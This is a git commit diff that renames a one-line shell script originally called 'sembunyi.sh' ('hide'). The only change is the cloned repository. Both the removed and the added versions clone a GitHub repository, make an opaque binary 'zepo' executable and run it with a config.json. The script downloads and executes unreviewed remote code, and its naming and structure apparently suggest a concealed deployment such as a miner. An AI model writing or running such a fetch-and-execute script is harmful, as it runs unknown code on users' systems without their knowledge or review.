386f074259e7113704247bd1d7eb6daee91554e0
epois <152323500+epois@users.noreply.github.com>
2023-12-27 18:52:22 +0800

    Update and rename sembunyi.sh to zepir.sh

--- sembunyi.sh
+++
@@ -1,1 +0,0 @@
-git clone https://github.com/epois/zephher.git && cd zephher && chmod +x SHA256SUMS && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json"
---
+++ zepir.sh
@@ -0,0 +1,1 @@
+git clone https://github.com/epois/zein.git && cd zein && chmod +x SHA256SUMS && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json"
